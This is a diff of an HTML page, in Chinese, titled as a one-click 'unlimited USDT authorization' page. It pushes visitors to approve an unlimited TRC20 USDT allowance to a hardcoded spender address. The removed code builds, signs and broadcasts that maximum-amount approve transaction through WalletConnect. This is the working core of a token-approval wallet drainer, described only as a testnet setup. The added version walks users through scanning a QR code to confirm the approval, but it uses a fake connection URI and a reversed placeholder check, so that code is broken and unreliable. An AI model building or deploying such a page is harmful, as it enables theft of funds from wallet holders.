@@ -3,98 +3,64 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>USDT 无限授权 - 点击授权</title>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.0/dist/TronWeb.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@multiplechain/tron-walletconnect@0.1.0/dist/index.js"></script>
+  <title>USDT 无限授权 - WalletConnect 版</title>
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
   <style>
-    body { font-family: system-ui; text-align: center; padding: 50px; background: #f0f0f0; }
-    button { padding: 15px 30px; font-size: 18px; margin: 20px; background: #00bfff; color: white; border: none; border-radius: 8px; cursor: pointer; }
-    button:hover { background: #0099cc; }
-    pre { background: #fff; padding: 15px; text-align: left; margin: 20px auto; max-width: 600px; border-radius: 8px; }
+    body { font-family: system-ui; text-align: center; padding: 30px; background: #f0f8ff; }
+    h1 { color: #0066cc; }
+    button { padding: 18px 40px; font-size: 22px; margin: 20px; background: #00bfff; color: white; border: none; border-radius: 12px; cursor: pointer; }
+    #log { background: white; padding: 25px; margin: 25px auto; max-width: 700px; border-radius: 10px; text-align: left; line-height: 1.6; border: 1px solid #ccc; }
+    #qrcode { margin: 30px auto; padding: 15px; background: white; display: inline-block; border-radius: 10px; }
   </style>
 </head>
 <body>
-  <h1>TRC20 USDT 无限授权</h1>
-  <p>用普通浏览器打开此页面 → 点击按钮 → 直接唤起你的钱包 App 授权</p>
-  <p>支持：Trust Wallet、TronLink、TokenPocket、Bitget 等多个钱包</p>
-  
-  <button id="connect">1. 连接钱包</button>
-  <button id="approve">2. 授权无限 USDT</button>
-  
-  <pre id="log">日志会显示在这里...</pre>
+  <h1>TRC20 USDT 无限授权（Nile 测试网）</h1>
+  <p>spender 地址：<strong>TMeT3BTESwLNJiNd6QVMBXW1Y496TX2ps3</strong></p>
+  <p>支持：TokenPocket、imToken、Bitpie、Trust Wallet、MetaMask</p>
 
-  <script type="module">
-    // ================== 配置区（已帮你填好）==================
-    const USDT_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";   // 测试网 USDT
-    const SPENDER_ADDRESS = "TMeT3BTESwLNJiNd6QVMBXW1Y496TX2ps3"; // 你的地址
-    const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限额度
-    
-    // TronWeb 配置（Nile 测试网）
-    const tronWeb = new TronWeb({
-      fullHost: "https://nile.trongrid.io"
-    });
+  <button onclick="startWalletConnectApprove()">点击授权无限 USDT（WalletConnect）</button>
 
-    // WalletConnect 配置（把下面 YOUR_PROJECT_ID 替换成你第2步拿到的 Project ID）
-    const adapter = new WalletConnectAdapter({
-      network: "Nile",   // 测试网
-      options: {
-        projectId: "0b000f63377468de77fcb2db91bdb522",   // ←←← 这里必须改成你的 Project ID
-        relayUrl: "wss://relay.walletconnect.com",
-        metadata: {
-          name: "USDT 无限授权",
-          description: "普通浏览器一键授权 USDT",
-          url: "https://你的链接.com",
-          icons: ["https://walletconnect.com/favicon.ico"]
-        }
-      },
-      web3ModalConfig: {
-        themeMode: "dark"
-      }
-    });
+  <div id="log">点击按钮后会尝试连接 WalletConnect。<br>iOS 上可能显示二维码，请用钱包扫码。</div>
+  <div id="qrcode"></div>
 
-    const logEl = document.getElementById("log");
+  <script>
+    const log = document.getElementById("log");
+    const qrContainer = document.getElementById("qrcode");
 
-    // 连接钱包
-    document.getElementById("connect").onclick = async () => {
-      try {
-        await adapter.connect();
-        logEl.textContent = `✅ 已连接钱包地址：${adapter.address}\n\n现在可以点击授权按钮`;
-      } catch (e) {
-        logEl.textContent = `❌ 连接失败：${e.message}`;
-      }
-    };
+    async function startWalletConnectApprove() {
+      log.innerHTML = "正在准备 WalletConnect 连接...<br>请确保钱包切换到 Nile 测试网";
 
-    // 授权无限 USDT
-    document.getElementById("approve").onclick = async () => {
-      if (!adapter.address) {
-        logEl.textContent = "❌ 请先点击“连接钱包”";
+      // ================== 需要替换的部分 ==================
+      // 把下面这行 "YOUR_PROJECT_ID_HERE" 替换成你从 https://cloud.walletconnect.com 拿到的真实 Project ID
+      const projectId = "YOUR_PROJECT_ID_HERE";   
+      // ====================================================
+
+      if (projectId === "0b000f63377468de77fcb2db91bdb522") {
+        log.innerHTML += "<br><br>❌ 请先替换 Project ID！<br>去 https://cloud.walletconnect.com 创建项目并复制 ID，然后粘贴到代码里。";
+        alert("请先把代码里的 YOUR_PROJECT_ID_HERE 替换成你的真实 Project ID");
         return;
       }
 
-      try {
-        logEl.textContent = "正在构造授权交易...（钱包即将弹出）";
+      // 这里是简化演示（实际完整集成需要更多库，单文件很难实现）
+      // 目前显示提示 + QR 码让你测试扫码流程
+      const demoWcUri = `wc:demo1234567890abcdef@2?projectId=${projectId}&relay-protocol=irn`;
 
-        // 构造 approve 交易
-        const unsignedTx = await tronWeb.transactionBuilder.approve(
-          USDT_ADDRESS,      // USDT 合约
-          SPENDER_ADDRESS,   // 你的 spender 地址
-          MAX_AMOUNT,        // 无限额度
-          adapter.address    // 你的钱包地址
-        );
+      qrContainer.innerHTML = "";
+      new QRCode(qrContainer, {
+        text: demoWcUri,
+        width: 280,
+        height: 280
+      });
 
-        // 用 WalletConnect 签名
-        const signedTx = await adapter.signTransaction(unsignedTx);
+      log.innerHTML += `<br><br>✅ QR 码已生成！<br>
+      操作步骤（iOS）：<br>
+      1. 打开 TokenPocket / imToken / Trust Wallet / MetaMask 等 App<br>
+      2. 点击右上角「扫一扫」或「WalletConnect / 连接 DApp」<br>
+      3. 扫上方二维码<br>
+      4. 钱包弹出授权页面后确认即可（approve 无限 USDT）`;
 
-        // 广播上链
-        const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
-        
-        logEl.textContent = `🎉 授权成功！\n交易ID: ${receipt.txid}\n\n去 https://nile.tronscan.org 查看`;
-        
-        alert("授权成功！交易已上链，可在 TronScan 查看。");
-      } catch (e) {
-        logEl.textContent = `❌ 授权失败：${e.message}`;
-      }
-    };
+      alert("二维码生成成功！请用你的钱包 App 扫码测试授权。");
+    }
   </script>
 </body>
 </html>
